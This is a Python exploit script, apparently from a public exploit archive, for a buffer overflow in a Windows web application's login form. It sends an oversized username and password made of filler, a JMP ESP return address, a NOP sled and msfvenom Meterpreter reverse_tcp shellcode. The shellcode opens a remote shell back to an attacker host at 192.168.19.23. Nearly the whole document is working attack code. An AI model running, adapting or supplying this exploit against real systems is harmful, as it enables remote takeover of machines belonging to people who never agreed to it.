# Tested on Windows 10 (x86)
# The application requires to have the web server enabled. 
# Exploit for older version: https://www.exploit-db.com/exploits/40832/

#!/usr/bin/python
 
import socket,os,time,struct,argparse


host = '192.168.23.103'
port = 38080

# root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.19.23 LPORT=4455 -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f py
shellcode =  ""
shellcode += "\xda\xc3\xd9\x74\x24\xf4\xba\x94\x22\xc6\x9f\x5f\x31"
shellcode += "\xc9\xb1\x59\x31\x57\x19\x83\xef\xfc\x03\x57\x15\x76"
shellcode += "\xd7\x3a\x77\xf9\x18\xc3\x88\x65\x28\x11\xec\xee\x18"
shellcode += "\xa5\x64\x15\x17\x97\x7a\x5e\x7a\x0c\xb2\x9f\xf0\x5e"
shellcode += "\x9c\x50\xb0\xd5\xfa\x5f\x7e\x45\x3e\xfe\x02\x94\x13"
shellcode += "\x20\x3a\x57\x66\x21\x7b\x21\x0c\xce\xd1\xe5\x65\x42"
shellcode += "\xc6\x82\x38\x5e\xe7\x44\x37\xde\x9f\xe1\x88\xaa\x13"
shellcode += "\xeb\xd8\xd9\xf4\xcb\xd9\x0e\x8f\x44\xc2\xe0\x15\x9d"
shellcode += "\x86\x3c\x5f\x2f\x98\xb7\x6b\xc4\x67\x11\xa2\x1a\xa6"
shellcode += "\x52\xc8\x36\x28\xab\xeb\xa6\x5e\xc7\x0f\x5a\x59\x1c"
shellcode += "\x6d\x80\xec\x82\xd5\x43\x56\x66\xe7\x80\x01\xed\xeb"
shellcode += "\x6d\x45\xa9\xef\x70\x8a\xc2\x14\xf8\x2d\x04\x9d\xba"
shellcode += "\x09\x80\xc5\x19\x33\x91\xa3\xcc\x4c\xc1\x0c\xb0\xe8"
shellcode += "\x8a\xbf\xa7\x8d\x73\x40\xc8\xd3\xe3\x8c\x05\xec\xf3"
shellcode += "\x9a\x1e\x9f\xc1\x05\xb5\x37\x69\xcd\x13\xcf\xf8\xd9"
shellcode += "\xa3\x1f\x42\x89\x5d\xa0\xb2\x83\x99\xf4\xe2\xbb\x08"
shellcode += "\x75\x69\x3c\xb4\xa0\x07\x36\x22\x8b\x7f\x55\xa5\x63"
shellcode += "\x7d\x5a\xd8\x14\x08\xbc\x8a\x8a\x5a\x11\x6b\x7b\x1a"
shellcode += "\xc1\x03\x91\x95\x3e\x33\x9a\x7c\x57\xde\x75\x28\x0f"
shellcode += "\x77\xef\x71\xdb\xe6\xf0\xac\xa1\x29\x7a\x44\x55\xe7"
shellcode += "\x8b\x2d\x45\x10\xec\xcd\x95\xe1\x99\xcd\xff\xe5\x0b"
shellcode += "\x9a\x97\xe7\x6a\xec\x37\x17\x59\x6f\x3f\xe7\x1c\x59"
shellcode += "\x4b\xde\x8a\xe5\x23\x1f\x5b\xe5\xb3\x49\x31\xe5\xdb"
shellcode += "\x2d\x61\xb6\xfe\x31\xbc\xab\x52\xa4\x3f\x9d\x07\x6f"
shellcode += "\x28\x23\x71\x47\xf7\xdc\x54\xdb\xf0\x22\x2a\xf4\x58"
shellcode += "\x4a\xd4\x44\x59\x8a\xbe\x44\x09\xe2\x35\x6a\xa6\xc2"
shellcode += "\xb6\xa1\xef\x4a\x3c\x24\x5d\xeb\x41\x6d\x03\xb5\x42"
shellcode += "\x82\x98\x46\x38\xeb\x1f\xa7\xbd\xe5\x7b\xa8\xbd\x09"
shellcode += "\x7a\x95\x6b\x30\x08\xd8\xaf\x07\x03\x6f\x8d\x2e\x8e"
shellcode += "\x8f\x81\x31\x9b"

buffer  = "\x41" * 780
buffer += struct.pack("<L", 0x10090c83) # JMP ESP - libspp
buffer += "\x90" * 12
buffer += shellcode
buffer += "\x90" * (10000 - len(buffer))

evil =  "POST /login HTTP/1.1\r\n"
evil += "Host: 192.168.23.103:33080\r\n"
evil += "User-Agent: Mozilla/5.0\r\n"
evil += "Connection: close\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 17000\r\n\r\n"
evil += "username=" + buffer
evil += "&password=" + buffer + "\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((host,port))
print 'Sending evil buffer...'
s.send(evil)
print 'Payload Sent!'
s.close()